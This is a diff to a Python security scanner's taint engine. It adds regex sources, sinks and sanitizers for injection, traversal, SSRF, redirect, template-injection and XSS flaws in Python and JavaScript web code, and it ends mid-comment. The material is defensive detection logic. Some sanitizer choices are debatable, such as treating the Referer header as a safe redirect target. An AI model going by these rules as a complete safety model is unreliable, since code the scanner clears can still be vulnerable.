@@ -34,7 +34,9 @@ the same only with --strict-taint-config.
 No dependencies — runs on stock python3. Same ruleset as the Lazaret dashboard.
 """
 import argparse
+import base64
 import bisect
+import collections
 import datetime
 import errno
 import html as html_mod
@@ -58,6 +60,10 @@ except Exception:  # pragma: no cover
 from lazaret.scanner import reports as lazaret_report  # report paths: pre-scan validation, atomic writes
 from lazaret.scanner import taintspec  # taint-config validation shared by both taint engines
 from lazaret.scanner import _unicode13  # the Unicode every engine reads source text in
+from lazaret.scanner import configsecrets  # config and data files: credentials only
+from lazaret.scanner import autorun  # editor and AI-agent settings that run commands (SC-AUTORUN)
+from lazaret.scanner import ghworkflow  # the workflows the Shai-Hulud worms planted (SC-WORKFLOW-*)
+from lazaret.scanner import frameworks  # web framework models shared by both taint engines
 
 
 def configure_stdio():
@@ -745,69 +751,156 @@ R("SQL-UPDATE-NOWHERE", "UPDATE without WHERE", "BUG", "MAJOR", ("sql",),
 # ---------------- Taint tracking (lightweight, intra-file) ----------------
 # Sources: user input and decode functions. Sinks: dangerous calls.
 TAINT_SOURCES = {
-    "py": re.compile(r"request\.(args|form|values|json|data|cookies|headers|files|get_json)"
+    # Flask / Werkzeug request data (query_string, get_data, stream, full_path
+    # too), Django's (GET, POST, COOKIES, META, FILES, body) and Starlette's,
+    # FastAPI's and Django REST framework's (query_params, path_params, a
+    # websocket's messages); the parameters a route handler takes from the
+    # request (_route_params)
+    "py": re.compile(r"request\.(args|form|values|json|data|cookies|headers|files|get_json|get_data"
+                     r"|query_string|stream|full_path|GET|POST|COOKIES|META|FILES|body|query_params|path_params)"
+                     r"|\b(?:websocket|ws)\.receive_(?:text|json|bytes)\s*\("
                      r"|input\s*\(|sys\.argv|b64decode\s*\(|zlib\.decompress\s*\("),
-    "js": re.compile(r"req\.(query|body|params|headers|cookies)|process\.argv"
-                     r"|location\.(search|hash|href)|document\.URL|new\s+URLSearchParams"
+    # Express's request (`req`, or `request` as a name of its own): the
+    # parsed parts, the URL and host, and a header read with req.get()
+    "js": re.compile(r"req\.(query|body|params|headers|cookies|signedCookies|files?|originalUrl|url|path|hostname)"
+                     r"|(?<![\w$.])request\.(query|body|params|headers|cookies)|\breq\.(?:get|header|param)\s*\("
+                     r"|process\.argv|location\.(search|hash|href)|document\.URL|new\s+URLSearchParams(?!\s*\(\s*\))"
                      r"|atob\s*\(|unescape\s*\(|decodeURIComponent\s*\("),
 }
 # (id-suffix, sink regex, category, severity, cwe, fix)
 TAINT_SINKS = {
     "py": [
-        ("CMD", re.compile(r"os\.(system|popen)\s*\(|subprocess\.(run|call|check_output|check_call|Popen)\s*\("),
+        ("CMD", re.compile(r"os\.(system|popen)\s*\(|subprocess\.(run|call|check_output|check_call|Popen)\s*\("
+                           r"|asyncio\.create_subprocess_shell\s*\("),
          "command injection", "CRITICAL", "CWE-78",
          "Validate/allowlist the value; pass args as a list with shell=False."),
         ("CODE", re.compile(r"(?<![\w.])(eval|exec)\s*\("),
          "code injection", "CRITICAL", "CWE-95",
          "Never execute untrusted strings; use safe parsing."),
-        ("SQL", re.compile(r"\.(execute|executemany)\s*\("),
+        # DB-API cursors, Django's Manager.raw and RawSQL (the query is their
+        # first argument) …
+        ("SQL", re.compile(r"\.(execute|executemany|executescript)\s*\(|\.objects\.raw\s*\(|(?<![\w.])RawSQL\s*\("),
          "SQL injection", "BLOCKER", "CWE-89",
          "Use parameterized queries."),
-        ("PATH", re.compile(r"(?<![\w.])open\s*\(|send_file\s*\(|send_from_directory\s*\("),
+        # … and Django's QuerySet.extra(), whose SQL is in its keywords
+        ("SQL", re.compile(r"\.extra\s*\(\s*(?:select|where|tables|order_by)\s*="),
+         "SQL injection", "BLOCKER", "CWE-89",
+         "Use parameterized queries."),
+        ("PATH", re.compile(r"(?<![\w.])open\s*\(|(?:codecs|io|os)\.open\s*\(|send_file\s*\("
+                            r"|(?<![\w.])FileResponse\s*\("
+                            r"|shutil\.(?:copy|copy2|copyfile|copytree|move|rmtree)\s*\("
+                            r"|os\.(?:remove|unlink|rmdir|removedirs|rename|replace|listdir|scandir)\s*\("),
          "path traversal", "MAJOR", "CWE-22",
          "Resolve the path and verify it stays inside an allowed base directory."),
-        ("SSRF", re.compile(r"requests\.(get|post|put|delete|head|request)\s*\(|urlopen\s*\("),
+        # Flask joins the file name to the directory safely (safe_join): the
+        # directory is the sink
+        ("PATH", re.compile(r"send_from_directory\s*\("),
+         "path traversal", "MAJOR", "CWE-22",
+         "Resolve the path and verify it stays inside an allowed base directory."),
+        ("SSRF", re.compile(r"requests\.(get|post|put|delete|head|request)\s*\(|urlopen\s*\("
+                            r"|httpx\.(?:get|post|put|patch|delete|head|request|stream)\s*\("),
          "server-side request forgery", "MAJOR", "CWE-918",
          "Allowlist target hosts and schemes; block internal addresses."),
-        ("REDIR", re.compile(r"(?<![\w.])redirect\s*\("),
+        ("REDIR", re.compile(r"(?<![\w.])redirect\s*\(|flask\.redirect\s*\("
+                             r"|HttpResponse(?:Permanent)?Redirect\s*\(|(?<![\w.])RedirectResponse\s*\("),
          "open redirect", "MAJOR", "CWE-601",
          "Allowlist redirect targets or use relative paths."),
-        ("SSTI", re.compile(r"render_template_string\s*\("),
+        ("SSTI", re.compile(r"render_template_string\s*\(|(?<![\w.])jinja2\.Template\s*\("
+                            r"|(?:\b\w*[eE]nv(?:ironment)?|Environment\s*\([^()]{0,200}\))\s*\.\s*from_string\s*\("),
          "template injection", "CRITICAL", "CWE-1336",
          "Pass data as template parameters, never into template source."),
+        # a Template class imported from jinja2, mako or django.template (not
+        # string.Template): only in a file that imports one (_TEMPLATE_IMPORT_RE)
+        ("SSTI", re.compile(r"(?<![\w.])Template\s*\("),
+         "template injection", "CRITICAL", "CWE-1336",
+         "Pass data as template parameters, never into template source."),
+        # a response body built from the value (Flask / Werkzeug, Django,
+        # Starlette / FastAPI), or the value marked as safe HTML; a Flask
+        # view's own `return` is checked too (taint_scan)
+        ("XSS", re.compile(r"make_response\s*\(|(?<![\w.])Response\s*\(|(?<![\w.])HttpResponse\s*\("
+                           r"|(?<![\w.])HTMLResponse\s*\(|(?<![\w.])Markup\s*\(|mark_safe\s*\("
+                           r"|(?<![\w.])SafeString\s*\("),
+         "cross-site scripting", "MAJOR", "CWE-79",
+         "Escape the value (or render it through an autoescaping template) before it is returned."),
     ],
     "js": [
         ("CMD", re.compile(r"\b(exec|execSync|spawn|spawnSync)\s*\("),
          "command injection", "CRITICAL", "CWE-78",
          "Use execFile/spawn with an args array; validate the value."),
-        ("CODE", re.compile(r"(?<![\w.])eval\s*\(|new\s+Function\s*\("),
+        ("CODE", re.compile(r"(?<![\w.])eval\s*\(|new\s+Function\s*\("
+                            r"|\bvm\.(?:runInNewContext|runInThisContext|runInContext|compileFunction)\s*\("
+                            r"|new\s+vm\.Script\s*\("),
          "code injection", "CRITICAL", "CWE-95",
          "Never execute untrusted strings; use JSON.parse or a dispatch map."),
-        ("SQL", re.compile(r"\.(query|execute)\s*\("),
+        # driver queries, and the raw SQL of knex and Sequelize
+        ("SQL", re.compile(r"\.(query|execute)\s*\(|\.(?:whereRaw|havingRaw|orderByRaw|joinRaw|groupByRaw|fromRaw)\s*\("
+                           r"|\bknex\.raw\s*\(|\bsequelize\.literal\s*\("),
          "SQL injection", "BLOCKER", "CWE-89",
          "Use placeholders with a parameter array."),
-        ("PATH", re.compile(r"\.(sendFile|download)\s*\(|readFile(Sync)?\s*\(|createReadStream\s*\("),
+        # (not Express's sendFile / download given a `root`: send refuses a
+        # path that climbs out of it)
+        ("PATH", re.compile(r"\.(sendFile|download)\s*\((?!(?:[^()]|\([^()]*\))*,\s*\{[^{}]*\broot\s*[:,}])"
+                            r"|readFile(Sync)?\s*\(|createReadStream\s*\("),
          "path traversal", "MAJOR", "CWE-22",
          "Resolve the path and verify it stays inside an allowed base directory."),
-        ("SSRF", re.compile(r"\bfetch\s*\(|axios(\.(get|post|put|delete|request))?\s*\(|https?\.(get|request)\s*\("),
+        # a file written, removed or listed (the path is the first argument)
+        ("PATH", re.compile(r"\bfs(?:\.promises)?\.(?:writeFile|appendFile|unlink|rm|rmdir|mkdir|readdir|rename"
+                            r"|copyFile|createWriteStream)(?:Sync)?\s*\("),
+         "path traversal", "MAJOR", "CWE-22",
+         "Resolve the path and verify it stays inside an allowed base directory."),
+        ("SSRF", re.compile(r"\bfetch\s*\(|axios(\.(get|post|put|delete|request))?\s*\(|https?\.(get|request)\s*\("
+                            r"|\bgot(?:\.(?:get|post|put|patch|delete|head|stream))?\s*\(|\bneedle\s*\("),
          "server-side request forgery", "MAJOR", "CWE-918",
          "Allowlist target hosts and schemes; block internal addresses."),
-        ("REDIR", re.compile(r"\.redirect\s*\("),
+        ("REDIR", re.compile(r"\.redirect\s*\(|\b(?:res|response)\.location\s*\("),
          "open redirect", "MAJOR", "CWE-601",
          "Allowlist redirect targets or use relative paths."),
+        # template source compiled or rendered: EJS, Pug, Handlebars,
+        # Mustache, Nunjucks, doT, lodash
+        ("SSTI", re.compile(r"\b(?:ejs|pug|jade|Handlebars|handlebars|Mustache|mustache|nunjucks|doT|_)"
+                            r"\.(?:render|renderString|compile|template)\s*\("),
+         "template injection", "CRITICAL", "CWE-1336",
+         "Pass data as template parameters, never into template source."),
         ("XSS", re.compile(r"\.innerHTML\s*=|document\.write\s*\("),
+         "cross-site scripting", "MAJOR", "CWE-79",
+         "Escape/sanitize before rendering; prefer textContent."),
+        # an Express or Node response body (Express sends a string as HTML;
+        # a whole parsed object, `res.send(req.query)`, as JSON)
+        ("XSS", re.compile(r"\b(?:res|response)(?:\.(?:status|type|set|header|append|vary|cookie|clearCookie)"
+                           r"\s*\([^()]{0,200}\))*\.(?:send|write|end)\s*\("
+                           r"(?!\s*(?:req|request)\.(?:query|body|params|headers|cookies|signedCookies)\s*\))"),
          "cross-site scripting", "MAJOR", "CWE-79",
          "Escape/sanitize before rendering; prefer textContent."),
     ],
 }
+# A response whose content type is set to one a browser does not render as
+# HTML (`HttpResponse(body, content_type="text/plain")`, `Response(data,
+# mimetype="application/json")`, `media_type=` in Starlette) is no XSS sink.
+_NON_HTML_TYPE_RE = re.compile(r"""\b(?:content_type|mimetype|media_type)\s*=\s*[rRuU]?["'](?![^"']*(?:html|xml|svg))""")
+# … nor is an Express response whose chain sets one first
+# (`res.type("text/plain").send(q)`, `res.set("Content-Type", "application/json").end(q)`).
+_NON_HTML_CHAIN_RE = re.compile(r"""\.(?:type\s*\(|(?:set|header)\s*\(\s*["'`][Cc][Oo][Nn][Tt][Ee][Nn][Tt]-[Tt][Yy][Pp][Ee]"""
+                                r"""["'`]\s*,)\s*["'`](?![^"'`]*(?:html|xml|svg))""")
+# The Template row of TAINT_SINKS["py"] counts only in a file that imports a
+# Template class from a template engine.
+_TEMPLATE_SINK_RE = next(row[1] for row in TAINT_SINKS["py"] if row[1].pattern == r"(?<![\w.])Template\s*\(")
+_TEMPLATE_IMPORT_RE = re.compile(
+    r"(?<![^\n])[ \t]*from[ \t]+(?:jinja2|mako\.template|django\.template)[ \t]+import\b[^\n]*\bTemplate\b")
 # Review fix (shared semantics 12): a Python annotated assignment
 # `x: T = source` binds x (the optional `: T` part), and a JS destructuring
 # declaration binds every name in its pattern (_JS_DESTRUCT_RE below) —
 # `target: str = request.args.get("next")` and `const { file } = req.query`
 # used to leave their names untainted.
+# An augmented assignment (`html += f"<p>{q}</p>"`) taints its target too.
 ASSIGN_RE = {
-    "py": re.compile(r"^\s*([A-Za-z_]\w*)\s*(?::[^=\n]*)?=(?![=])\s*(.+)"),
-    "js": re.compile(r"^\s*(?:(?:const|let|var)\s+)?([A-Za-z_$][\w$]*)\s*=(?![=>])\s*(.+)"),
+    "py": re.compile(r"^\s*([A-Za-z_]\w*)\s*(?::[^=\n]*|[-+*/%&|^@]|//|\*\*|<<|>>)?=(?![=])\s*(.+)"),
+    "js": re.compile(r"^\s*(?:(?:const|let|var)\s+)?([A-Za-z_$][\w$]*)\s*"
+                     r"(?:[-+*/%&|^]|\*\*|<<|>>>?|&&|\|\||\?\?)?=(?![=>])\s*(.+)"),
+}
+# the augmented forms (`x += y`, `x ||= y`): the target keeps what it held
+_AUG_ASSIGN_RE = {
+    "py": re.compile(r"^\s*[A-Za-z_]\w*\s*(?:[-+*/%&|^@]|//|\*\*|<<|>>)="),
+    "js": re.compile(r"^\s*[A-Za-z_$][\w$]*\s*(?:[-+*/%&|^]|\*\*|<<|>>>?|&&|\|\||\?\?)="),
 }
 # one-level object / array pattern: `{ a, b: c, d = 1, ...e }` / `[a, , b = 2, ...c]`
 _JS_DESTRUCT_RE = re.compile(
@@ -850,7 +943,135 @@ def _assignment(line, lang):
                 return names, dm.group(2)
     return None, None
 
+# A value put into a container — an element assigned (`d["k"] = q`,
+# `arr[i] = q`) or added (`xs.append(q)`, `arr.push(q)`) — taints the
+# container: what is read from it may be the value. A weak update: the
+# container keeps what it held.
+_CONTAINER_WRITE_RE = {
+    "py": re.compile(r"^\s*([A-Za-z_]\w*)\s*(?:\[[^\[\]\n]*\]\s*(?:[-+*/%&|^@]|//|\*\*|<<|>>)?=(?!=)"
+                     r"|\.\s*(?:append|extend|insert|add)\s*\()\s*(.+)"),
+    "js": re.compile(r"^\s*([A-Za-z_$][\w$]*)\s*(?:\[[^\[\]\n]*\]\s*(?:[-+*/%&|^]|\*\*|<<|>>>?|&&|\|\||\?\?)?=(?![=>])"
+                     r"|\.\s*(?:push|unshift)\s*\()\s*(.+)"),
+}
+
+
+# An element assigned under a literal key (`d["k"] = v`) is followed by its
+# key too: reading `d["other"]` after `d["other"] = "fixed"` reads no
+# untrusted data though `d` holds some. Only plain assignments: an
+# augmented one, a computed key or a method keeps the container's taint.
+_KEYED_WRITE_RE = re.compile(r"""^\s*([A-Za-z_$][\w$]*)\s*\[\s*(["'])([^"'\\\n]*)\2\s*\]\s*=(?![=>])""")
+_KEYED_READ_RE = re.compile(r"""(?<![\w$.])([A-Za-z_$][\w$]*)\s*\[\s*(["'])([^"'\\\n]*)\2\s*\]""")
+
+
+def _keyed_reads(text, keyed):
+    """`text` with its reads of container elements known to hold no
+    untrusted data (see above) blanked. `keyed`: {container: {key: clean
+    set, or None for a value with no untrusted data}}."""
+    if not keyed or "[" not in text:
+        return text
+
+    def repl(m):
+        keys = keyed.get(m.group(1))
+        if keys is None or m.group(3) not in keys or keys[m.group(3)] is not None:
+            return m.group()
+        return " " * len(m.group())
+    return _KEYED_READ_RE.sub(repl, text)
+
+
+def _container_write(line, lang):
+    """(container name, the value written) of a line that puts a value into
+    a container (see above), or (None, None)."""
+    m = _CONTAINER_WRITE_RE[lang].match(line)
+    if not m or (lang == "py" and keyword.iskeyword(m.group(1))):
+        return None, None
+    added = line[m.end(1):m.start(2)].rstrip().endswith("(")       # xs.append(…): its arguments
+    return m.group(1), (_extent(m.group(2)) if added else m.group(2))
+
 STRING_LIT_RE = re.compile(r"\"[^\"]*\"|'[^']*'|`[^`]*`")
+
+# What taint reads of a text: its string literals removed, except the fields
+# of a Python f-string (`f"/srv/{name}"`, prefix f / rf / fr in either case)
+# and of a JavaScript template literal no tag reads (`ls ${dir}` — a tagged
+# sql`…${x}` template is parameterized): those are code whose value becomes
+# part of the string. A field is the text between one-level braces;
+# `{{` / `}}` in an f-string are literal braces.
+_FIELD_RE = {"py": re.compile(r"\{([^{}]*)\}"), "js": re.compile(r"\$\{([^{}]*)\}")}
+# A Python literal with its prefix (r, b, u, f or a pair of them), which is
+# part of the literal and not a name: `os.system(f"ls {d}")` reads `d`, not a
+# variable called f.
+_PY_LIT_RE = re.compile(r"(?:(?<![A-Za-z0-9_])([rRbBuUfF]{1,2}))?(\"[^\"]*\"|'[^']*'|`[^`]*`)")
+_ASCII_WORD = frozenset("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_$")
+_JS_TAG_KEYWORDS = frozenset(("return", "typeof", "case", "in", "of", "yield", "await", "throw",
+                              "delete", "void", "else", "do", "new"))
+
+
+def _js_tagged(text, start):
+    """True when the backtick at `start` opens a tagged template (sql`…`)."""
+    j = start
+    while j > 0 and text[j - 1] in " \t":
+        j -= 1
+    if j == 0 or not (text[j - 1] in _ASCII_WORD or text[j - 1] in ")]"):
+        return False
+    k = j
+    while k > 0 and text[k - 1] in _ASCII_WORD:
+        k -= 1
+    return text[k:j] not in _JS_TAG_KEYWORDS
+
+
+# An element looked up by a key (`users[req.params.id]`, `COMMANDS[q]`) is
+# the container's, not the key's: taint reads a subscript's container and
+# not its index (`request.args["q"]` is still request data), and the same
+# for the index arguments of JavaScript's slice(), substring(), at() …
+# (`names.slice(from, to)`). Innermost subscripts first, at most
+# _SUBSCRIPT_PASSES levels deep; a `[` after a keyword opens a list
+# (`return [q]`, `x in [q]`), not a subscript.
+_SUBSCRIPT_RE = re.compile(r"((?<![\w$])[\w$]+|[)\]])(\s*)\[[^\[\]]*\]")
+_INDEX_ARGS_RE = re.compile(r"(\.\s*(?:slice|substring|substr|at|charAt|charCodeAt|codePointAt)\s*\()([^()]*)\)")
+_SUBSCRIPT_PASSES = 4
+_NOT_SUBSCRIPTED = frozenset((
+    "return", "yield", "in", "await", "else", "and", "or", "not", "is", "if", "lambda", "assert", "del",
+    "typeof", "case", "of", "new", "delete", "void", "throw", "instanceof", "print", "elif", "while", "for",
+    "with", "from", "import", "raise", "except", "do"))
+
+
+def _subscript_repl(m):
+    if m.group(1) in _NOT_SUBSCRIPTED:
+        return m.group()
+    return m.group(1) + m.group(2) + " " * (len(m.group()) - len(m.group(1)) - len(m.group(2)))
+
+
+def _drop_indexes(text):
+    """`text` with its subscripts' indexes blanked (see above)."""
+    if "." in text:
+        text = _INDEX_ARGS_RE.sub(lambda m: m.group(1) + " " * len(m.group(2)) + ")", text)
+    for _ in range(_SUBSCRIPT_PASSES):
+        if "[" not in text:
+            break
+        new = _SUBSCRIPT_RE.sub(_subscript_repl, text)
+        if new == text:
+            break
+        text = new
+    return text
+
+
+def _taint_code(text, lang):
+    """`text` without its string literals and subscripts' indexes, as taint
+    reads it (see above)."""
+    if lang == "py":
+        def py_repl(m):
+            if (m.group(1) or "").lower() not in ("f", "rf", "fr") or m.group(2)[0] == "`":
+                return ""
+            body = m.group(2)[1:-1].replace("{{", "  ").replace("}}", "  ")
+            return " " + " ".join(_FIELD_RE["py"].findall(body)) + " "
+        return _drop_indexes(_PY_LIT_RE.sub(py_repl, text))
+
+    def js_repl(m):
+        lit = m.group()
+        if lit[0] != "`" or _js_tagged(text, m.start()):
+            return ""
+        return " " + " ".join(_FIELD_RE["js"].findall(lit[1:-1])) + " "
+    return _drop_indexes(STRING_LIT_RE.sub(js_repl, text))
+
 
 # ---------------- Sanitizer model (SonarQube / Semgrep style) ----------------
 # Values passed through a sanitizer stop being tainted. "full" sanitizers
@@ -858,27 +1079,62 @@ STRING_LIT_RE = re.compile(r"\"[^\"]*\"|'[^']*'|`[^`]*`")
 # suffix) cleanse one category. Body pattern allows one level of nested parens
 # so int(request.args.get("id")) is recognized.
 _SAN_BODY = r"(?:[^()]|\([^()]*\))*"
+# A record looked up by a value (Django's get_object_or_404(Model, pk=q),
+# Model.objects.filter(name=q); Flask-SQLAlchemy's Model.query.filter_by(…),
+# SQLAlchemy's session.execute(…) / .get / .scalars) is the database's, not
+# the value: the ORM binds the value as a parameter, and what it returns is
+# not request data. Nor is what a file read gives (`open(p).read()`,
+# `fs.readFileSync(p)`): the path is the read's own path-traversal sink.
 _FULL_SAN = {
-    "py": re.compile(r"(?:int|float|bool|complex|uuid\.UUID|ipaddress\.ip_address)\s*\(" + _SAN_BODY + r"\)"),
-    "js": re.compile(r"(?:parseInt|parseFloat|Number)\s*\(" + _SAN_BODY + r"\)"),
+    "py": re.compile(r"(?:int|float|bool|complex|uuid\.UUID|ipaddress\.ip_address|get_object_or_404|get_list_or_404"
+                     r"|\.objects\.\w+|\.query\.\w+|\bsession\.(?:query|get|scalars?|execute))\s*\(" + _SAN_BODY + r"\)"
+                     r"|(?<![\w.])open\s*\(" + _SAN_BODY + r"\)\s*\.\s*read(?:lines)?\s*\(\s*\)"),
+    "js": re.compile(r"(?:parseInt|parseFloat|Number|readFileSync)\s*\(" + _SAN_BODY + r"\)"),
 }
 _PARTIAL_SAN = {
     "py": {
         "CMD": re.compile(r"(?:shlex|pipes)\.quote\s*\(" + _SAN_BODY + r"\)"),
-        "XSS": re.compile(r"(?:html\.escape|markupsafe\.escape|cgi\.escape|bleach\.clean|escape)\s*\(" + _SAN_BODY + r"\)"),
-        "PATH": re.compile(r"(?:os\.path\.basename|basename|secure_filename)\s*\(" + _SAN_BODY + r"\)"),
+        # escape(), escape_html(), …; an autoescaping template and the JSON
+        # and URL builders encode the value too. Not unescape().
+        "XSS": re.compile(r"(?<!\w)(?:html\.escape|markupsafe\.escape|cgi\.escape|escape\w*|bleach\.clean"
+                          r"|conditional_escape|format_html|render_template|render_to_string|TemplateResponse"
+                          r"|jsonify|url_for)\s*\(" + _SAN_BODY + r"\)"),
+        "PATH": re.compile(r"(?:os\.path\.basename|basename|secure_filename|safe_join)\s*\(" + _SAN_BODY + r"\)"),
+        # url_for and Django's reverse() build a URL on this site from a
+        # view's name (Flask's, Starlette's request.url_for); the Referer is
+        # the page the user came from (a redirect "back")
+        "REDIR": re.compile(r"(?<![\w.])(?:[A-Za-z_][\w.]*\.)?(?:url_for|reverse|reverse_lazy)\s*\(" + _SAN_BODY + r"\)"
+                            r"|request\.(?:META\.get|headers\.get)\s*\(\s*[\"'](?:HTTP_REFERER|[Rr]eferr?er)[\"']"
+                            + _SAN_BODY + r"\)|request\.META\s*\[\s*[\"']HTTP_REFERER[\"']\s*\]"),
     },
     "js": {
-        "XSS": re.compile(r"(?:DOMPurify\.sanitize|encodeURIComponent|escapeHtml|sanitizeHtml)\s*\(" + _SAN_BODY + r"\)"),
+        "XSS": re.compile(r"(?:DOMPurify\.sanitize|encodeURIComponent|escapeHtml|sanitizeHtml|he\.(?:encode|escape)"
+                          r"|validator\.escape|filterXSS|xssFilters\.\w+|_\.escape|lodash\.escape)\s*\("
+                          + _SAN_BODY + r"\)"),
         "SQL": re.compile(r"(?:mysql2?|pool|connection|conn|db)\.escape\s*\(" + _SAN_BODY + r"\)"),
         "PATH": re.compile(r"path\.basename\s*\(" + _SAN_BODY + r"\)"),
         "CMD": re.compile(r"(?:shellQuote|shell_quote)\s*\(" + _SAN_BODY + r"\)"),
+        # the Referer: the page the user came from (a redirect "back")
+        "REDIR": re.compile(r"\b(?:req|request)\.(?:get|header)\s*\(\s*['\"][Rr]eferr?er['\"]\s*\)"
+                            r"|\b(?:req|request)\.headers\s*(?:\.\s*referr?er\b|\[\s*['\"]referr?er['\"]\s*\])"),
     },
 }
+
+# Flask's typed lookup, `request.args.get("page", 1, type=int)`, returns a
+# number (or the default): a full sanitizer like int(…).
+_TYPED_GET_RE = re.compile(r"(?<![\w.])[A-Za-z_][\w.]*\.get(?:list)?\s*\(([^()]{0,256})\)")
+_TYPED_ARG_RE = re.compile(r"\btype\s*=\s*(?:int|float|bool)\b")
+
+
+def _typed_get(m):
+    return " " if _TYPED_ARG_RE.search(m.group(1)) else m.group()
+
 
 def _neutralize(text, lang, suffix=None):
     """Strip sanitizer calls so their sanitized content stops counting as taint."""
     text = _FULL_SAN[lang].sub(" ", text)
+    if lang == "py" and "type" in text:
+        text = _TYPED_GET_RE.sub(_typed_get, text)
     if suffix and suffix in _PARTIAL_SAN.get(lang, {}):
         text = _PARTIAL_SAN[lang][suffix].sub(" ", text)
     return text
@@ -1113,6 +1369,516 @@ def load_taint_config_for_scan(explicit_path, scan_root, trust_repo=False,
 _IDENT_RUN_RE = {"py": re.compile(r"\w+"), "js": re.compile(r"[\w$]+")}
 
 
+# A statement taint reads may run over several lines: a line whose brackets
+# stay open (`RESPONSE += (` / `subprocess.run(` / `const q = \`…`) is read
+# together with the lines that continue it — at most TAINT_JOIN_MAX_LINES of
+# them and TAINT_JOIN_MAX_CHARS of their text, joined with spaces.
+TAINT_JOIN_MAX_LINES = 8
+TAINT_JOIN_MAX_CHARS = 4000
+_BRACKET_DELTA = {"(": 1, "[": 1, "{": 1, ")": -1, "]": -1, "}": -1}
+
+
+def _bracket_depth(code):
+    """Brackets `code` opens and leaves open (string literals not counted)."""
+    return sum(_BRACKET_DELTA.get(ch, 0) for ch in STRING_LIT_RE.sub("", code))
+
+
+def _arg_end(text, start):
+    """Index of the comma or closing bracket that ends the argument starting
+    at `start` in `text` (len(text) when nothing does); brackets and string
+    literals inside the argument are skipped."""
+    depth, i, n = 0, start, len(text)
+    while i < n:
+        ch = text[i]
+        if ch in "\"'`":
+            j = text.find(ch, i + 1)
+            if j < 0:
+                return n
+            i = j + 1
+            continue
+        if ch in "([{":
+            depth += 1
+        elif ch in ")]}":
+            if depth == 0:
+                return i
+            depth -= 1
+        elif ch == "," and depth == 0:
+            return i
+        i += 1
+    return n
+
+
+def _call_close(text, start):
+    """Index of the bracket that closes a call whose arguments start at
+    `start` in `text` (len(text) when nothing does)."""
+    while True:
+        end = _arg_end(text, start)
+        if end >= len(text) or text[end] != ",":
+            return end
+        start = end + 1
+
+
+def _first_arg(text):
+    """The first argument of a call whose text after the opening parenthesis
+    is `text`; a parenthesized tuple is read as its first element
+    (`make_response((body, {"X-H": v}))` → `body`)."""
+    arg = text[:_arg_end(text, 0)]
+    s = arg.lstrip()
+    if s.startswith("("):
+        k = _arg_end(s, 1)
+        if k < len(s) and s[k] == ",":
+            return s[1:k]
+    return arg
+
+
+# a keyword argument that names no target (`data=`, `cwd=`, `timeout=`); the
+# ones that do (`url=`, `file=`, `args=`, …) are read like positional ones
+_KWARG_RE = re.compile(r"\s*(?!(?:url|uri|file|filename|path|path_or_file|args|cmd|command|src|dst|source"
+                       r"|destination)\s*=)[A-Za-z_]\w*\s*=(?!=)")
+
+
+def _positional_args(text):
+    """A call's arguments (`text` follows its opening parenthesis) without its
+    keyword arguments (see above): `requests.post(url, data=d)` → `url`."""
+    out, i, n = [], 0, len(text)
+    while True:
+        end = _arg_end(text, i)
+        arg = text[i:end]
+        if not _KWARG_RE.match(arg):
+            out.append(arg)
+        if end >= n or text[end] != ",":
+            return ",".join(out)
+        i = end + 1
+
+
+# Which arguments of a built-in sink carry the injection. Only the first: a
+# query's bound parameters (`execute(sql, (x,))`), a response's status and
+# headers, a redirect's code, a template's context and eval's namespaces are
+# data — and send_from_directory's directory: it joins the file name safely.
+# In JavaScript the first too for a query, a template's source, a file
+# written or removed (`fs.writeFile(p, data)`) and a response body
+# (`res.send(body)`). Only the positional ones: `requests.post(url, data=d)`,
+# `send_file(f, download_name=n)` and `subprocess.run(cmd, cwd=d)` name no
+# target in their keywords. Other rows (the rest of the JavaScript ones,
+# Django's `.extra(where=[…])`, the rows a taint config adds) read every
+# argument — never the code after the call on the same line
+# (`exec(cmd); log(location.href)`).
+_SINK_ARGS = {row[1]: "first" for row in TAINT_SINKS["py"]
+              if row[0] in ("SQL", "XSS", "REDIR", "SSTI", "CODE") and "extra" not in row[1].pattern}
+_SINK_ARGS.update({row[1]: "positional" for row in TAINT_SINKS["py"]
+                   if row[0] in ("CMD", "PATH", "SSRF") and "send_from_directory" not in row[1].pattern})
+_SINK_ARGS.update({row[1]: "first" for row in TAINT_SINKS["py"] if "send_from_directory" in row[1].pattern})
+_SINK_ARGS.update({row[1]: "first" for row in TAINT_SINKS["js"]
+                   if row[0] in ("SQL", "SSTI") or (row[0] == "PATH" and "writeFile" in row[1].pattern)
+                   or (row[0] == "XSS" and "send" in row[1].pattern)})
+
+
+def _extent(text):
+    """`text` (what follows a sink's match) up to the end of the sink's
+    arguments: the bracket that closes the call, or the end of the statement
+    (a `;` outside brackets) for an assignment sink such as `.innerHTML =`."""
+    depth, i, n = 0, 0, len(text)
+    while i < n:
+        ch = text[i]
+        if ch in "\"'`":
+            j = text.find(ch, i + 1)
+            if j < 0:
+                return text
+            i = j + 1
+            continue
+        if ch in "([{":
+            depth += 1
+        elif ch in ")]}":
+            if depth == 0:
+                return text[:i]
+            depth -= 1
+        elif ch == ";" and depth == 0:
+            return text[:i]
+        i += 1
+    return text
+
+
+# A redirect to a path on this site: an argument that starts with a string
+# literal holding '/' and then neither '/' nor '\\' nor the literal's end
+# nor a field (`redirect("/user/" + id)`, `res.redirect(f"/search?q={q}")`)
+# cannot change the host; neither can one that starts with a scheme, a host
+# (no field in it) and a '/' (`"https://github.com/org/repo/commit/%s" %
+# rev`). A value assigned from such an expression is clean for open redirect
+# (taint_scan).
+_SAME_SITE_RE = re.compile(r"""\s*[rRuUfF]{0,2}["'`](?:/(?![/\\"'`{$])|https?://[^/"'`?#\\\s{}$]+/)""")
+
+
+def _offsite_args(args):
+    """`args` without the arguments that redirect to this site (see above)."""
+    out, i, n = [], 0, len(args)
+    while True:
+        end = _arg_end(args, i)
+        arg = args[i:end]
+        if not _SAME_SITE_RE.match(arg):
+            out.append(arg)
+        if end >= n or args[end] != ",":
+            return ",".join(out)
+        i = end + 1
+
+
+def _sink_args(text, sink_re, lang, suffix):
+    """The part of a sink's arguments (`text` follows the sink's match) that
+    carries the injection (see above)."""
+    mode = _SINK_ARGS.get(sink_re)
+    if mode == "first":
+        args = _first_arg(text)
+    elif mode == "positional":
+        args = _positional_args(text)
+    else:
+        args = _extent(text)
+    return _offsite_args(args) if suffix == "REDIR" else args
+
+
+# Path-traversal guards (barrier guards): a condition that rejects a value
+# holding '..' or checks that it stays under a base directory, on a branch
+# that leaves — `if ".." in name: abort(400)`, `if not path.startswith(BASE):
+# return …`, `if (p.includes("..")) return next(err)`. After one, the value
+# (and what is built from it) no longer carries path traversal. The exit is
+# on the `if` line or starts a line of its block (the lines below it, more
